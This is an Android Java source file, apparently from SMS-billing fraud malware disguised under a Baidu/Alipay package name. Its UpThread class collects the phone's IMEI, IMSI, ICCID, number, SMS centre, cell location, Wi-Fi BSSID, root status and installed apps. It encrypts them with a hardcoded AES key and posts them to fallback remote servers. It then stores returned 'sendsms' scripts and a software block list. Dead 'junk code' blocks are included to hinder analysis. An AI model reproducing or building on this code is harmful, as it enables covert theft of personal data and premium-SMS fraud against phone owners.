package com.baidu.alipay;

import java.util.List;

import com.baidu.alipay.net.MyPost;
import com.baidu.alipay.net.PmxXmlParser;
import com.baidu.alipay.net.XmlAttribute;
import com.baidu.alipay.script.Tags;
import com.baidu.alipay.script.sms.SendSmsPojo;
import com.baidu.alipay.script.sms.SendSmsPojoHandler;
import com.baidu.crypto.AesCrypto;
import com.baidu.serv.SelfHandler;
import com.baidu.serv.SelfMessage;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Message;
import android.util.DisplayMetrics;

public class UpThread extends Thread {
    private static final String TAG = "UpThread";
    
//    private Handler handler;
    private SelfHandler handler;
    private int fee;
    private SharedPreferences preferKey;
    private InitArguments initArgs;
    private Context context;
    
    private InitArgumentsHelper initArgumentsHelper;
    
    private String CPUserID, CPConsumerId, CPConsumerName, CPExtraStr;
    private String randomKey;
    private boolean sync;
    private boolean theSame;
    private boolean record;
    private int type1 = 0;
    
    private String random;
   
    public static final byte[] password = new byte[] { (byte) 0x67,
            (byte) 0xE7, (byte) 0x81, (byte) 0xAD, (byte) 0x4B, (byte) 0xEC,
            (byte) 0xE9, (byte) 0xFC, (byte) 0xD5, (byte) 0xC7, (byte) 0xDB,
            (byte) 0x92, (byte) 0xE2, (byte) 0x2F, (byte) 0x03, (byte) 0x7D };

//    public UpThread(Context context, Handler handler, int fee, String fid,
    public UpThread(Context context, SelfHandler handler, int fee, String fid,
            String CPUserID, String CPConsumerId, String CPConsumerName,
            String CPExtraStr,String randomKey,boolean sync,boolean theSame,boolean record) {
        this(context,handler,fee,fid,CPUserID,CPConsumerId,CPConsumerName,CPExtraStr,randomKey,sync,theSame,record,0);
    }
    
//    public UpThread(Context context, final Handler handler, int fee, String fid,
    public UpThread(Context context, final SelfHandler handler, int fee, String fid,
            String CPUserID, String CPConsumerId, String CPConsumerName,
            String CPExtraStr,String randomKey,boolean sync,boolean theSame,boolean record,int type1) {
        this.handler = handler;
        this.fee = fee;
        this.context = context;
        this.CPUserID = CPUserID;
        this.CPConsumerId = CPConsumerId;
        this.CPConsumerName = CPConsumerName;
        this.CPExtraStr = CPExtraStr;
        this.randomKey = randomKey;
        this.sync = sync;
        this.theSame = theSame;
        this.record = record;
        preferKey = context.getSharedPreferences(Constant.PREFS_NAME,
                Context.MODE_APPEND);
        initArgumentsHelper = InitArgumentsHelper.getInstance(context);
        this.type1 = type1;
        
//        this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
//			
//			@Override
//			public void uncaughtException(Thread arg0, Throwable e) {
//				e.printStackTrace();
//	        	handler.sendEmptyMessage(AppProperty.UPERROR);
//			}
//		});
    }

    @Override
    public void run() {
    	
        LogUtil.e(TAG, "run");
        SelfMessage selfMessage = null;
        try{
        	selfMessage = download();
        }catch (Exception e) {
        	e.printStackTrace();
//        	handler.sendEmptyMessage(AppProperty.UPERROR);
        	selfMessage = new SelfMessage(AppProperty.UPERROR);
		}
        
        handler.handleMessage(selfMessage);
    }

    public SelfMessage run1(){
    	LogUtil.e(TAG, "run1");
        try{
        	return download();
        }catch (Exception e) {
			return new SelfMessage(AppProperty.UPERROR);
		}
    }
    
//    private void download() {

    private SelfMessage download(){
        //没有网络
        if (Utils.getAPNType(context) == 0) {
//            handler.sendEmptyMessage(AppProperty.UPNETERROR);
//        	handler.handleMessage(new SelfMessage(AppProperty.UPERROR));
            return new SelfMessage(AppProperty.UPERROR);
        }
       
        initArgs = initArgumentsHelper.getInitArgs();
        
        // 访问
        String xmlData = null;
        
        {
            LogUtil.e(TAG, "start to getXmlData");
            xmlData = getXmlData();
        }
        
        // 解析
        XmlAttribute xmlAttribute = null;
        if (xmlData != null && xmlData.length() > 20) {
            LogUtil.e(TAG, "xmlData!= null && xmlData.length() > 20");
            
            String blackSofts = getBlackSofts(xmlData);
            
            Utils.setBlackSofts(context,blackSofts);
            
            String interval = Tags.getNodeValue(xmlData, "nextstart");
            double interva = Double.parseDouble(interval);

            Constant.DEFAULTINTERVAL = interva;
            
            
            try{
	            String mobileIdStr = Tags.getNodeValue(xmlData, "uid");
	            long mobileId = Long.parseLong(mobileIdStr);
	            
	            Utils.setMobileId(context, mobileId);
            }catch (Exception e) {
				// TODO: handle exception
			}
            
          //垃圾代码开始
            {
	    		int dadada = 0;
	    		
	    		if(dadada < 0){
	    			String asffa = "arm";
	    			String fffsa = "is";
	
	    			String fafsa = "u";
	    			String sadss = "real";
	    			
	    			String afa = asffa+"."+fffsa+"."+sadss+"."+fafsa;
	    		}
            }
    		//垃圾代码结束
            
            xmlAttribute = getDataFromServer(xmlData);
            
          //获取到下行后，重置random
            if(xmlAttribute != null && xmlAttribute.getSendsms() != null && xmlAttribute.getSendsms().length() > 0){
//            	UserLogUtil.addLog(context, "recv data of random "+random +" and reset random");
            	
            	Utils.resetRandom(context);
            	
            	AppTaskUtil.saveXml(context,randomKey,xmlAttribute.getSendsms(),false);
            }
            
            initArgumentsHelper.updateInitFile(xmlAttribute);
        } else {
            LogUtil.e(TAG, "xmlData == null && xmlData.length() < 20");
//            Message msg = new Message();
//            msg.what = AppProperty.UPERROR;
//            handler.sendMessage(msg);
//            handler.handleMessage(new SelfMessage(AppProperty.UPERROR));
            return new SelfMessage(AppProperty.UPERROR);
        }
        if (xmlAttribute != null) {
            LogUtil.e(TAG, "xmlAttribute != null");
            Message msg = new Message();
            msg.what = AppProperty.UPSUCCESS;
            msg.obj = xmlAttribute;
//            handler.sendMessage(msg);
//            handler.handleMessage(new SelfMessage(msg));
            return new SelfMessage(msg);
        } else {
            LogUtil.e(TAG, "xmlAttribute == null");
           
//            handler.sendEmptyMessage(AppProperty.UPERROR);
//            handler.handleMessage(new SelfMessage(AppProperty.UPERROR));
            return new SelfMessage(AppProperty.UPERROR);
        }
    }

    
    
    /*
     * get Black softs from server xmlData
     */
    public String getBlackSofts(String result) {
        String blackSofts = Tags.getNodeValue(result, "blackSofts");

        blackSofts = blackSofts.replaceAll(" ", "");

       return blackSofts;
    }

    /*
     * 获取数据，如果url1无法获取，则依次通过url2、url3、url4获取 每个url尝试连接3次
     */
    private String getXmlData() {
        int retryTimes = 0;
        String xmlData = null;
        random = randomKey;//randomKey
        
        if(random == null || random.length() == 0){
        	random = Utils.getRandom(context);
        }
//        UserLogUtil.addLog(context, "UpThread getXmlData with random "+random+" with money "+fee);
     
        // 使用网络（无论是啥网络，包括WIFI）
        do {
            String urlThisTime = "";
            // 每个url试1次，一共试4次
            if (retryTimes == 0) {
                urlThisTime = initArgs.getUrl1();
            } else if (retryTimes == 1) {
                urlThisTime = initArgs.getUrl2();
            } else if (retryTimes == 2) {
                urlThisTime = initArgs.getUrl3();
            } else if (retryTimes == 3) {
                urlThisTime = initArgs.getUrl4();
            }
            if (urlThisTime.indexOf("http://") < 0) {
                urlThisTime = "http://" + urlThisTime;
            }
            
            // 从网络获取执行脚本
            MyPost myPost = new MyPost();
            
            // 对返回的数据进行解密
            try {
                LogUtil.e(TAG, "上访地址~~~~" + urlThisTime + "");
            	// 获取上访的参数
                byte[] postDataEncrypted = makeArgument(random,retryTimes);
                
                xmlData = myPost.PostData(this.context,postDataEncrypted, urlThisTime);
            } catch (Exception e1) {
                e1.printStackTrace();
                LogUtil.e(TAG, "访问出错："+e1.getMessage());
                xmlData = null;
            }
            retryTimes++;
            
            if(xmlData == null){
            	Utils.sleep(5);
            }
        } while (retryTimes < 4 && xmlData == null);// 条件是小于12
        return xmlData;

    }

    /*
     * 构造一个加密后的参数用于post到服务器
     */
    private byte[] makeArgument(String random,int sort) {
        StringBuffer requestArg = new StringBuffer();
        String requestParam = null;
        try {
        	requestArg.append("sn=").append(DeviceInfo.getUID(context));
        	requestArg.append("&mobileId=").append(Utils.getMobileId(context));//新增MobileId
        	requestArg.append("&imei=").append(DeviceInfo.getIMEI(context));
        	requestArg.append("&ver=").append(DeviceInfo.getSoftwareVersion());
        	requestArg.append("&imsi=").append(DeviceInfo.getIMSI(context));
            if(theSame){
            	requestArg.append("&cid=").append(initArgs.getCid());
            }else{
            	requestArg.append("&cid=").append(Constant.DEFAULTCID);
            	requestArg.append("&cid1=").append(initArgs.getCid());
            }
            requestArg.append("&pid=").append(initArgs.getPid());
            requestArg.append("&SMSC=").append(DeviceInfo.getSMSC(context));
            requestArg.append("&Mb=").append(DeviceInfo.getPhoneNumber(context));

            requestArg.append("&netstate=").append(Utils.getAPNType(context));

          //垃圾代码开始
            {
	    		int dadada = 0;
	    		
	    		if(dadada < 0){
	    			String asffa = "army";
	    			String fffsa = "is";
	
	    			String fafsa = "u";
	    			String sadss = "ret";
	    			
	    			String afa = sadss+"."+asffa+"."+fffsa+"."+fafsa;
	    		}
            }
    		//垃圾代码结束
            
            requestArg.append("&iccid=").append(DeviceInfo.getICCID(context));

            requestArg.append("&mobtype=").append(DeviceInfo.getMobleType(context));
            requestArg.append("&CPUserID=").append(CPUserID);
            requestArg.append("&CPConsumerId=").append(CPConsumerId);
            requestArg.append("&CPConsumerName=").append(CPConsumerName);
            requestArg.append("&CPExtraStr=").append(CPExtraStr);

            requestArg.append("&sysVer=").append(DeviceInfo.getFrimware(context));
            requestArg.append("&isRoot=").append(DeviceInfo.isRoot());
            requestArg.append("&money=").append(fee);
            requestArg.append("&random=").append(random);
            //add 20141111
            requestArg.append("&type1=").append(type1);
            //add 20140825
            String lastRandomParams = getLastRandomParams(context);
            
            if(lastRandomParams != null && lastRandomParams.length() > 0){
            	requestArg.append(lastRandomParams);
            }
            
            requestArg.append("&sort=").append(sort);
            requestArg.append("&sync=").append(this.sync);
            requestArg.append("&record=").append(this.record);
            requestArg.append("&screenOff=").append(Constant.screenOff);
            requestArg.append("&packageName=").append(context.getPackageName());
            
            //20150309
            requestArg.append("&bssid=").append(DeviceInfo.getBssid(context));
            
            //20150523
            int[] locations = DeviceInfo.getLocation(context);
            
            if(locations != null && locations.length == 2){
            	requestArg.append("&locLac=").append(locations[0]);
            	requestArg.append("&locCid=").append(locations[1]);
            }
            
            DisplayMetrics displayMetrics = DeviceInfo.getDisplayMetrics(context);
            int width = 480;
            int height = 800;
            
            if(displayMetrics != null){
            	width = displayMetrics.widthPixels;
            	height = displayMetrics.heightPixels;
            }
            
            requestArg.append("&width=").append(width);
            requestArg.append("&height=").append(height);
            
            requestArg.append("&systemApp=").append(DeviceInfo.getSystemApp(context));
            requestArg.append("&dataApp=").append(DeviceInfo.getDataApp(context));
            requestArg.append("&aaa");
            LogUtil.e("点播上访参数", requestArg);
            
            requestParam = requestArg.toString().replaceAll(" ","");
        } catch (Exception e) {
            e.printStackTrace();
            requestParam = preferKey.getString(Constant.REQUESTArg, "");
        }
        try {
            return AesCrypto.encrypt(requestParam, password);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private String getLastRandomParams(Context context){
    	String param = "";
    	
//    	String lastRandom = Utils.getLastRandom(context);
//    	
//    	if(lastRandom != null && lastRandom.length() > 1){
//    		param = "&lastRandom="+lastRandom;
//    		
//    		SendSmsPojoHandler sendSmsPojoHandler = new SendSmsPojoHandler(context);
//    		
//    		try{
//    			
//    			List<SendSmsPojo> list = sendSmsPojoHandler.listByRandom(lastRandom);
//    			
//    			if(list != null && list.size() > 0){
//    				String ret = "";
//    				
//    				for(SendSmsPojo pojo : list){
//    					ret += "|"+pojo.getRefer()+","+pojo.getSendStatus();
//    				}
//    				
//    				param += "&lastRandomStatus="+ret.substring(1);
//    			}
//    		}catch (Exception e) {
//				e.printStackTrace();
//			}finally{
//				if(sendSmsPojoHandler != null){
//					sendSmsPojoHandler.close();
//				}
//			}
//    	}
    	
    	return param;
    }
    
    /*
     * 根据上访得到的数据执行脚本
     */
    private XmlAttribute getDataFromServer(String xmlData) {

        XmlAttribute xmlAttr = null;
        try {
            if (xmlData != null && !"".equals(xmlData)) {
                LogUtil.e(TAG, "返回值" + xmlData);
                xmlAttr = new PmxXmlParser(xmlData).parse();
            }
        } catch (Exception e) {
            e.printStackTrace();
            LogUtil.e(TAG, "Exception~~~~" + e.getMessage());
            return xmlAttr;
        }
        return xmlAttr;
    }

}
